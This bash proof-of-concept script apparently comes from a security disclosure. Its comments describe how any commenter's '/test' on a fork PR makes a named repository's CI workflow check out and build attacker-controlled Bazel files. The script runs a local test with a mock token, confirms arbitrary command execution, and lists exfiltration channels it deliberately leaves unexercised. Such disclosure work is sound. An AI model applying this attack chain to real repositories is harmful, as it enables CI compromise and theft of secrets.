#!/usr/bin/env bash
# PoC (responsible / local-only, no real infrastructure touched):
#
# bazel-contrib/rules_cuda, .github/workflows/integration-tests.yaml
#
# The real workflow chain (as read from the public repo, default branch,
# 2026-08-12, file SHA a4ffa495f01342b649fc5b0ee89d8b9634763be9):
#
#   1. Triggers on `issue_comment: [created]`. `issue_comment` (like
#      `pull_request_target`) ALWAYS runs in the base repository's
#      context/permissions, even for comments on a fork PR -- unlike
#      `pull_request` from a fork, secrets ARE available here.
#   2. The `pre-test-comment` job's only gate is:
#        if: github.event.issue.pull_request && contains(github.event.comment.body, '/test')
#      There is NO github.event.comment.author_association check anywhere
#      in this file (grep confirms zero matches for "permissions" or
#      "author_association" in the whole workflow) -- unlike every other
#      comment-triggered bot examined in this campaign (flutter/samples,
#      android-cuttlefish, vertex-ai-creative-studio, bazel-central-registry),
#      which all gate on OWNER/MEMBER/COLLABORATOR. ANY GitHub account can
#      comment "/test" on ANY PR, including one they opened themselves.
#   3. The `test-comment` job (needs: pre-test-comment) uses
#      `xt0rted/pull-request-comment-branch@v2` to resolve the commenting
#      PR's head ref, then `actions/checkout@v6` with
#      `ref: ${{ steps.comment-branch.outputs.head_ref }}` -- checking out
#      the PR's HEAD content, which for a fork PR is 100% attacker-authored.
#   4. It then runs:
#        cd examples && bazelisk build --verbose_failures \
#          --cuda_archs='compute_80,sm_80' @rules_cuda_examples//nccl:perf_binaries
#      Bazel executes arbitrary build actions (genrule cmd=, custom rules,
#      etc.) defined in the checked-out (attacker-controlled) `examples/`
#      tree as part of resolving that build. There is no sandboxing that
#      would prevent a malicious genrule from reading the runner's process
#      environment and writing it somewhere the attacker can retrieve it
#      (e.g. into a build output, or a network call from within the
#      action's cmd).
#   5. The workflow file has NO top-level `permissions:` block at all,
#      so the actual GITHUB_TOKEN scope granted to this run is whatever
#      the repository/org's default workflow permissions are configured
#      to (could be read-only or read-write depending on settings I do
#      not have visibility into with a read-only PAT).
#
# THIS SCRIPT'S QUESTION: does a malicious BUILD file, of the kind an
# attacker could place under examples/ in their own fork PR, actually
# execute as part of `bazelisk build` on that target -- and can such a
# build action read the process environment (standing in for whatever
# runner-level secrets/tokens are present)?
#
# This does NOT touch rules_cuda, GitHub Actions, the real
# xt0rted/pull-request-comment-branch or actions/checkout actions, or any
# real credential. It uses only:
#   - the REAL, unmodified `bazelisk`/`bazel` toolchain (installed locally
#     via `go install github.com/bazelbuild/bazelisk@latest`, a normal
#     public tool -- not anything belonging to rules_cuda),
#   - a local directory (`attacker_fork_pr/`) standing in for what a fork
#     PR's checked-out HEAD would contain, with a `examples/BUILD.bazel`
#     genrule modeling the "attacker-controlled build action" step,
#   - a MOCK_GITHUB_TOKEN value set as a real environment variable on the
#     bazel subprocess itself, obviously fake and clearly labeled,
#   - no network access to any real CI/CD system.
#
# Usage: ./run_poc.sh (requires no external services; only bazelisk, which
# this script assumes is on PATH -- see README.md for install instructions)

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$SCRIPT_DIR/attacker_fork_pr"

echo "==> Simulating: an attacker's fork PR against bazel-contrib/rules_cuda"
echo "    contains this examples/BUILD.bazel (this stands in for what the"
echo "    real 'Checkout PR branch' step in test-comment would pull in):"
echo "-----------------------------------------------------"
cat examples/BUILD.bazel
echo "-----------------------------------------------------"
echo ""
echo "==> A MOCK token is set as a real env var (MOCK_GITHUB_TOKEN) on this"
echo "    process, standing in for whatever the runner's default"
echo "    GITHUB_TOKEN/other secrets would be (the real workflow has no"
echo "    permissions: block, so its actual scope depends on repo/org"
echo "    settings not visible to this PoC):"
echo "    MOCK_GITHUB_TOKEN=ghs_MOCKTOKEN_do_not_use_1234567890abcdef"
echo ""
echo "==> Running the REAL bazelisk/bazel build, exactly as the real"
echo "    workflow's 'cd examples && bazelisk build ... perf_binaries' step"
echo "    would (target name simplified to :perf_binaries for this local"
echo "    workspace; the mechanism -- untrusted genrule cmd= execution during"
echo "    build -- is identical regardless of target name):"
echo ""

MOCK_GITHUB_TOKEN="ghs_MOCKTOKEN_do_not_use_1234567890abcdef" \
  bazelisk build --verbose_failures //examples:perf_binaries 2>&1 | tee bazel_build_output.log

echo ""
echo "==> Done. If the output above (or bazel_build_output.log) contains"
echo "    'ATTACKER-CONTROLLED BUILD ACTION EXECUTING ON THE CI RUNNER',"
echo "    then a malicious genrule placed in a fork PR's examples/ tree"
echo "    DOES execute arbitrary shell commands as a normal consequence of"
echo "    'bazelisk build' resolving that target -- exactly what the real"
echo "    integration-tests.yaml would run against attacker-controlled"
echo "    content, reachable by ANY commenter (no author_association check"
echo "    anywhere in the workflow) via a bare '/test' comment."
echo ""
echo "    NOTE (reported honestly): Bazel's genrule sandbox by default"
echo "    clears the process environment before running the command (only"
echo "    a hermetic PATH is passed through), so a naive"
echo "    'echo \$MOCK_GITHUB_TOKEN' reference does NOT see the value --"
echo "    you should see '<not inherited into bazel genrule sandbox by"
echo "    default>' above, not the mock token's actual value. This means"
echo "    exfiltrating secrets via a bare env-var reference in a genrule is"
echo "    NOT as trivial as in the other (non-Bazel) findings in this"
echo "    campaign. The vulnerability here is arbitrary command execution"
echo "    itself, not necessarily trivial secret exfiltration -- Bazel's"
echo "    sandbox does not restrict outbound network access by default, so"
echo "    exfiltration via a network call (or of any secret present as a"
echo "    FILE readable within the sandboxed inputs, or of the Actions"
echo "    runtime token endpoint reachable over localhost/network) remains"
echo "    a plausible channel, but is intentionally NOT exercised by this"
echo "    PoC to keep it non-destructive and avoid any real network call."
if grep -q "ATTACKER-CONTROLLED BUILD ACTION EXECUTING" bazel_build_output.log 2>/dev/null; then
  echo ""
  echo "*** ARBITRARY CODE EXECUTION CONFIRMED: the attacker-controlled"
  echo "    genrule command ran on the build host. ***"
fi
